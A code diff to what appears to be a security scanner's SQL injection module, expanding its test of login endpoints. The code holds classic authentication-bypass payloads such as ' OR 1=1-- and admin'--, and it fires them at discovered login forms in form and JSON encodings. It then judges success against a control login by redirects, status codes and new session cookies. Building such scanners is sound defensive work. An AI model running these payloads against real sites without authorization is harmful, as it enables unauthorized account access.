@@ -175,56 +175,157 @@ class SQLiScanner(BaseScanner):
                     )
 
     def _test_login_endpoints(self, base_url: str) -> None:
-        """POST common login forms with SQL injection payloads."""
-        for login_path in LOGIN_ENDPOINTS:
+        """POST common login forms with SQL injection payloads using both JSON and form encoding."""
+        login_paths = list(LOGIN_ENDPOINTS)
+        fields_by_path: Dict[str, List[str]] = {}
+        for ep in self.discovered_endpoints or []:
+            p = ep.get("path", "")
+            param = ep.get("param", "")
+            if not p:
+                continue
+            p_lower = p.lower()
+            if any(kw in p_lower for kw in ("login", "signin", "auth", "session")):
+                if p not in login_paths:
+                    login_paths.append(p)
+            if param:
+                fields_by_path.setdefault(p, []).append(param)
+
+        for login_path in login_paths:
             url = f"{base_url}{login_path}"
-            for payload in ["' OR 1=1--", "admin'--", "' OR '1'='1'--"]:
-                bodies = [
-                    {"username": payload, "password": "password"},
-                    {"email": payload, "password": "password"},
-                    {"user": payload, "pass": "password"},
+            disc_fields = fields_by_path.get(login_path, [])
+            candidate_pairs = []
+            if disc_fields:
+                user_f = next((f for f in disc_fields if any(u in f.lower() for u in ("user", "email", "login", "account", "name"))), disc_fields[0])
+                pass_f = next((f for f in disc_fields if any(p in f.lower() for p in ("pass", "pwd"))), "password")
+                candidate_pairs.append((user_f, pass_f))
+            candidate_pairs.extend([
+                ("username", "password"),
+                ("email", "password"),
+                ("user", "pass"),
+            ])
+            seen_pairs = set()
+            unique_pairs = []
+            for u, p in candidate_pairs:
+                if (u, p) not in seen_pairs:
+                    seen_pairs.add((u, p))
+                    unique_pairs.append((u, p))
+
+            for user_field, pass_field in unique_pairs:
+                modes = [
+                    ("form", lambda b: {"data": b, "headers": {**HEADERS, "Content-Type": "application/x-www-form-urlencoded"}}),
+                    ("json", lambda b: {"json_data": b, "headers": {**HEADERS, "Content-Type": "application/json"}}),
                 ]
-                for body in bodies:
-                    resp = self._safe_request(
+                for mode_name, kwargs_builder in modes:
+                    # 1. Send control login with invalid credentials to establish baseline
+                    ctrl_body = {user_field: "autosec_invalid_user", pass_field: "wrong_password_999"}
+                    ctrl_resp = self._safe_request(
                         "POST",
                         url,
-                        json_data=body,
-                        headers={**HEADERS, "Content-Type": "application/json"},
                         timeout=REQUEST_TIMEOUT,
-                        allow_redirects=True,
+                        allow_redirects=False,
+                        **kwargs_builder(ctrl_body),
                     )
-                    if resp is None:
-                        continue
-                    match = self._check_sql_errors(resp.text)
-                    if match:
-                        self.results.append({
-                            "endpoint": login_path,
-                            "payload": payload,
-                            "matched_signature": match,
-                            "status_code": resp.status_code,
-                            "evidence": resp.text[:300],
-                            "type": "login_bypass",
-                        })
-                        logger.info(
-                            f"[SQLi] Possible login bypass at {login_path} "
-                            f"with payload: {payload!r}"
+                    ctrl_status = ctrl_resp.status_code if ctrl_resp is not None else None
+                    ctrl_loc = (ctrl_resp.headers.get("Location") or "").strip() if ctrl_resp and getattr(ctrl_resp, "headers", None) else ""
+                    ctrl_cookies = set(ctrl_resp.cookies.keys()) if ctrl_resp and getattr(ctrl_resp, "cookies", None) else set()
+                    ctrl_text = ctrl_resp.text.lower() if ctrl_resp and getattr(ctrl_resp, "text", None) else ""
+
+                    hit = False
+                    for payload in ["' OR 1=1--", "' OR '1'='1'--", "admin'--", "' OR 1=1", "' OR '1'='1"]:
+                        body = {user_field: payload, pass_field: "password"}
+                        resp = self._safe_request(
+                            "POST",
+                            url,
+                            timeout=REQUEST_TIMEOUT,
+                            allow_redirects=False,
+                            **kwargs_builder(body),
                         )
-                        return  # one hit per login endpoint
-                    # Heuristic: if we got HTTP 200 with a short JSON body
-                    # that contains "token" or "auth", might be a bypass
-                    if resp.status_code == 200 and (
-                        "token" in resp.text.lower()
-                        or "authentication" in resp.text.lower()
-                    ):
-                        self.results.append({
-                            "endpoint": login_path,
-                            "payload": payload,
-                            "matched_signature": "authentication_bypass_heuristic",
-                            "status_code": resp.status_code,
-                            "evidence": resp.text[:300],
-                            "type": "login_bypass",
-                        })
-                        return
+                        if resp is None:
+                            continue
+
+                        # Check for SQL error leak
+                        match = self._check_sql_errors(resp.text)
+                        if match and (ctrl_resp is None or match not in ctrl_text):
+                            self.results.append({
+                                "endpoint": login_path,
+                                "param": user_field,
+                                "payload": payload,
+                                "matched_signature": match,
+                                "status_code": resp.status_code,
+                                "evidence": resp.text[:300],
+                                "type": "login_bypass",
+                                "verified": True,
+                                "confidence": "high",
+                            })
+                            logger.info(
+                                f"[SQLi] Verified login injection at {login_path} ({mode_name}) "
+                                f"with payload: {payload!r}"
+                            )
+                            hit = True
+                            break
+
+                        # Check for success signal that the control response lacks
+                        resp_loc = (resp.headers.get("Location") or "").strip() if getattr(resp, "headers", None) else ""
+                        resp_cookies = set(resp.cookies.keys()) if getattr(resp, "cookies", None) else set()
+                        new_cookies = resp_cookies - ctrl_cookies
+                        has_new_session_cookie = any(any(k in c.lower() for k in ("session", "token", "auth", "sid", "jwt")) for c in new_cookies)
+
+                        # Redirect bypass: control did not redirect (or redirected to error), but injected redirected to valid dashboard/target
+                        is_redirect_bypass = False
+                        if resp.status_code in (301, 302, 303, 307, 308):
+                            if ctrl_status not in (301, 302, 303, 307, 308):
+                                if resp_loc != login_path and not any(err in resp_loc.lower() for err in ("error", "fail", "invalid", "login?")):
+                                    is_redirect_bypass = True
+                            else:
+                                if resp_loc != ctrl_loc and resp_loc not in (login_path, ctrl_loc) and not any(err in resp_loc.lower() for err in ("error", "fail", "invalid", "login?")):
+                                    is_redirect_bypass = True
+
+                        # Status code bypass: control got 401/403 and injection got 200 without error phrases
+                        is_status_bypass = (
+                            ctrl_status in (401, 403)
+                            and resp.status_code == 200
+                            and not any(err in resp.text.lower() for err in ("invalid", "incorrect", "unauthorized", "failed", "try again"))
+                        )
+
+                        # Cookie bypass: new session cookie was set that control did not receive
+                        is_cookie_bypass = has_new_session_cookie and (is_redirect_bypass or resp.status_code == 200)
+
+                        # Heuristic bypass: 200 with auth token where control lacked it
+                        is_heuristic_bypass = (
+                            resp.status_code == 200
+                            and ("token" in resp.text.lower() or "authentication" in resp.text.lower())
+                            and ("token" not in ctrl_text and "authentication" not in ctrl_text)
+                        )
+
+                        if is_redirect_bypass or is_status_bypass or is_cookie_bypass or is_heuristic_bypass:
+                            ev = f"HTTP {resp.status_code}"
+                            if getattr(resp, "headers", None) and resp.headers.get("Location"):
+                                ev += f" Location: {resp.headers.get('Location')}"
+                            if getattr(resp, "cookies", None):
+                                ev += f" Cookies: {list(resp.cookies.keys())}"
+                            if getattr(resp, "text", None):
+                                ev += f" Body: {resp.text[:200]}"
+                            self.results.append({
+                                "endpoint": login_path,
+                                "param": user_field,
+                                "payload": payload,
+                                "matched_signature": "authentication_bypass_differential_success",
+                                "status_code": resp.status_code,
+                                "evidence": ev,
+                                "type": "login_bypass",
+                                "verified": True,
+                                "confidence": "high",
+                            })
+                            logger.info(
+                                f"[SQLi] Verified login bypass at {login_path} ({mode_name}) "
+                                f"with payload: {payload!r}"
+                            )
+                            hit = True
+                            break
+                    if hit:
+                        break
+                if hit:
+                    break
 
     def _test_url_path_injection(self, base_url: str) -> None:
         """Try path-based injection on REST-style numeric IDs."""
